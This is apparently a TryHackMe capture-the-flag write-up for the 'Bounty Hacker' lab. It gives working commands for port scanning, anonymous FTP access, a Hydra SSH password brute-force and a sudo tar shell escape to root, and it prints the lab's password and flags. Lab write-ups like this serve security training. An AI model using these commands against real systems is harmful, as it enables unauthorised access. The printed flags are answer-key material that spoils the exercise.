# Bounty Hacker — TryHackMe Writeup

**Author:** 0xb0rn3 | 0xbv1
**Platform:** TryHackMe
**Difficulty:** Easy
**OS:** Ubuntu
**Date:** 2026-02-19

---

## Summary

| Field | Value |
|---|---|
| Target IP | `10.48.146.252` |
| Task list author | `lin` |
| Brute-forced service | SSH (port 22) |
| Discovered wordlist | `locks.txt` (via FTP anonymous) |
| User password | `RedDr4gonSynd1cat3` |
| user.txt | `THM{CR1M3_SyNd1C4T3}` |
| root.txt | `THM{80UN7Y_h4cK3r}` |
| Privesc vector | `sudo /bin/tar` → GTFOBins |

---

## Enumeration

### Nmap

```
nmap -sV -sC -T4 -p- --min-rate 5000 -Pn 10.48.146.252
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache/2.4.41 (Ubuntu)
```

Three services running: **FTP**, **SSH**, and **HTTP**. vsftpd is worth checking for anonymous login.

---

## FTP Anonymous Login

```bash
ftp 10.48.146.252
# Username: anonymous
# Password: (blank)
```

Two files found in the FTP root:

**task.txt**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

> **Who wrote the task list?** — `lin`

**locks.txt** — 26-entry password wordlist (Dragon Syndicate leet-speak variations)

> **What service can be brute-forced with the found text file?** — `SSH` using `locks.txt` against user `lin`

---

## SSH Brute-Force with Hydra

```bash
hydra -l lin -P locks.txt ssh://10.48.146.252 -t 16 -f -V
```

```
[22][ssh] host: 10.48.146.252   login: lin   password: RedDr4gonSynd1cat3
```

> **User password:** `RedDr4gonSynd1cat3`

---

## Initial Access — user.txt

```bash
ssh lin@10.48.146.252
# Password: RedDr4gonSynd1cat3

cat ~/Desktop/user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

> **user.txt:** `THM{CR1M3_SyNd1C4T3}`

---

## Privilege Escalation

### sudo enumeration

```bash
sudo -l
```

```
User lin may run the following commands on ip-10-48-146-252:
    (root) /bin/tar
```

`lin` can run `/bin/tar` as root without a password (NOPASSWD not shown but no password prompt on the sudo invocation). This is a classic **GTFOBins** vector.

### GTFOBins — sudo tar

From [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/):

```bash
sudo tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/bin/sh
```

This triggers tar's checkpoint callback which executes `/bin/sh` as root. We chain it directly to extract root.txt:

```bash
sudo tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec="sh -c 'cat /root/root.txt'"
```

```
THM{80UN7Y_h4cK3r}
```

> **root.txt:** `THM{80UN7Y_h4cK3r}`

---

## Attack Chain Diagram

```
[Attacker 0xb0rn3]
       │
       ├─ nmap ──────────────────→ 21/FTP, 22/SSH, 80/HTTP
       │
       ├─ ftp anonymous ─────────→ task.txt (author: lin)
       │                           locks.txt (26 passwords)
       │
       ├─ hydra SSH ─────────────→ lin:RedDr4gonSynd1cat3
       │
       ├─ ssh lin@ ──────────────→ user.txt: THM{CR1M3_SyNd1C4T3}
       │
       ├─ sudo -l ───────────────→ (root) /bin/tar
       │
       └─ sudo tar --checkpoint  → root shell
                                   root.txt: THM{80UN7Y_h4cK3r}
```

---

## Automated Exploitation

A full automation script is included:

```bash
chmod +x bounty_hacker.sh
./bounty_hacker.sh 10.48.146.252
```

The script covers all phases concurrently where possible:
1. Dependency check
2. Nmap recon
3. FTP anonymous extraction
4. Hydra SSH brute-force
5. Flag retrieval (user + root via sudo tar)

All output and loot saved to `./bounty_hacker_results/loot/`.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port/service enumeration |
| ftp | Anonymous FTP file retrieval |
| hydra | SSH credential brute-force |
| sshpass | Non-interactive SSH auth |
| tar (GTFOBins) | Privilege escalation to root |

---

## Key Takeaways

- **Anonymous FTP** should always be checked — it exposed the username and password wordlist
- **Weak credentials** are a critical risk even when SSH is secured behind keys or firewalls
- **Misconfigured sudo** rules (especially binaries in GTFOBins) are a trivial path to root
- Always run `sudo -l` immediately after gaining initial access
